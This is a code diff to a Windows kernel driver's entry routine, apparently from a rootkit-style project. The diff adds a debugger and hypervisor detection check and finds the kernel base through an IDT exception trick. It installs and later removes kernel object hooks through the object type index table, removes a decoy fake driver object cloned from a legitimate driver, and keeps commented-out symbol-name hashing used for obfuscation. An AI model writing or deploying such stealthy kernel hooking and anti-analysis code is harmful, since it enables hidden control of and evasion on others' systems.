@@ -24,8 +24,15 @@ extern "C" NTSTATUS DriverEntry() {
 
 	size_t size{};
 
-		// Init Funcion Pointer Table
+	//const wchar_t* test = L"PsLoadedModuleList";
+	//auto encrpy = hash::salted_hash_string_ci( test, helpers::wcslen( test ) );
+	//DbgPrint( "Hash: %llx", encrpy );
+
+		// Init Function Pointer Table
 		func_pointer_table table_handle = { 0 };
+
+		// Check if driver is running in debugger or hypervisor env]
+		modules::check_env();
 	
 		// Find NTOSKRNL Base
 		status = modules::throw_idt_exception( base, size );
@@ -36,21 +43,12 @@ extern "C" NTSTATUS DriverEntry() {
 		// Create HookManager using the with index table address as constructor
 		mngr::HookManager manager( table_handle.ObTypeIndexTable );
 
-		// Find and expose a legit Windows driver to copy its metadata to our dummy : Hash this too
-		modules::get_driver_object( L"\\Driver\\spaceport", tar_obj, table_handle );
-
-		// Create the Fake Driver Object purely to be used as a decoy
-		PDRIVER_OBJECT fake_obj = modules::AllocateFakeDriverObject( tar_obj, fakeDriver, table_handle );
-
 		// Install hooks
 		manager.HookObjects( 1 );
 
 		LARGE_INTEGER delay;
-		delay.QuadPart = -10LL * 1000 * 1000 * 30; // 10 seconds
+		delay.QuadPart = -10LL * 1000 * 1000 * 10; // 10 seconds
 		KeDelayExecutionThread( KernelMode, FALSE, &delay );
-
-		// Clean up decoy driver object
-		modules::DeallocateFakeDriverObject( fake_obj, table_handle );
 
 		// Unhook before unload
 		manager.HookObjects( 0 );
